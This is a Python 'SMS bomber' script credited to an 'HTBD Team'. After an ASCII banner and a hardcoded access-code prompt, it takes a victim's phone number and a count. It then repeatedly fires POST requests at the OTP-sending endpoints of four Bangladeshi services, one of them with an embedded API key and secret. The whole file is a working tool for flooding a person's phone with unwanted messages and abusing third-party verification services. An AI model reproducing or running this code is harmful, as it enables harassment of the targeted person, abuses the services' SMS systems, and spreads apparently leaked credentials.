import os
os.system("clear")
import smtplib
import json
import os
try:
 import requests
except:
 os.system("pip install requests")
 import requests
import time
from requests.structures import CaseInsensitiveDict

from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"
os.system('clear')
line=red+" The Tools Varson : 2.0 "

space=" "
os.system("clear")
logo=print(cyan+"""
▇◤▔▔▔▔▔▔▔◥▇
▇▏◥▇◣┊◢▇◤▕▇HTBD
▇▏▃▆▅▎▅▆▃▕▇TEAM ADMIN....
▇▏╱▔▕▎▔▔╲▕▇ SMS
▇◣◣▃▅▎▅▃◢◢▇B0MBER
▇▇◣◥▅▅▅◤◢▇▇T00ls
▇▇▇◣╲▇╱◢▇▇▇▇▇▇
▇▇▇▇◣▇◢▇▇▇▇▇▇▇
""")

text=lightblue+"\t\tCreated By : "+yellow+"Easin Hosen Riju..... 		Varson: 2.0"+cyan+"\n\n\t\t★★ "+purple+"HTBD Team ADMIN"+cyan+"★★   \n"     
def header():
 print(logo)
 print(text)
 print(line)

#SEC    
header()
print(red+"____________________________________________________")
print(blue+"\t\tYou need to security key")
print(red+"---------------------------------------------------‌‌‌‌‌‌‌-")
n=2
while n==2:
 a=str(input(cyan+"\n\n\t\t[>] Entar HTBD Team Security ::::------: "+green))
 if a=="19170":
  print(green+"\n\n\t\t[ √ ] Request Accepted")
  n=3
 else:
  print(red+"\n\n\t\t[ × ] Incorrect security code!\n\t\tPlease Try Again")
  n=2
  text=str(input(" press Entar To Continue :	"))

import os
os.system(" clear")
print("""
▇◤▔▔▔▔▔▔▔◥▇
▇▏◥▇◣┊◢▇◤▕▇HTBD..
▇▏▃▆▅▎▅▆▃▕▇TEAM ADMIN..
▇▏╱▔▕▎▔▔╲▕▇ SMS
▇◣◣▃▅▎▅▃◢◢▇B0MBER
▇▇◣◥▅▅▅◤◢▇▇T00ls
▇▇▇◣╲▇╱◢▇▇▇
▇▇▇▇◣▇◢▇▇▇▇ Devolvement By : Easin Hosen Riju
""")

import requests
from requests.structures import CaseInsensitiveDict
number=str(input("Enter your number : "))
amount=int(input("Enter the amount  : "))
url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number




url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"
headers2["Content-Length"] = "0"


url3 = "https://dev.10minuteschool.com/api/v4/auth/sendOtp?contact=88"+number+''

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/x-www-form-urlencoded"
headers3["Content-Length"] = "0"

url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"

data4 = '{\"mobile\":\"'+number+'\"}'



for j in range (amount):
 resp1 = requests.post(url1, headers=headers1, data=data1)
 resp2 = requests.post(url2, headers=headers2)
 resp3 = requests.post(url3, headers=headers3)
 resp4 = requests.post(url4, headers=headers4, data=data4)

 print(str(j+1)+"HTBD Send SMS")